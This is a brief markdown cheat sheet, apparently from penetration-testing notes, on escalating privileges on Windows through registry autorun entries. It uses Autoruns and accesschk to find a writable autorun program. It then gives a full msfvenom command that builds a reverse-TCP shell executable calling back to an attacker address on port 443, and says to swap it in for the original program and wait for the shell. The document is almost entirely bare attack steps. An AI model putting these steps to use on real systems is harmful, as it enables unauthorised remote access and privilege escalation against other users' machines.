# Registry
## Autorun
* C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe -> Look for strange programs
* C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\PATH\PROGRAM"
If you can overwrite, try to create a file with the same name but with reverse shell content
* msfvenom -p windows/shell/reverse_tcp lhost=X.X.X.X -lport=443 -f exe -o program.exe
* Then wait a few seconds or access into the other user and you'll get your shell
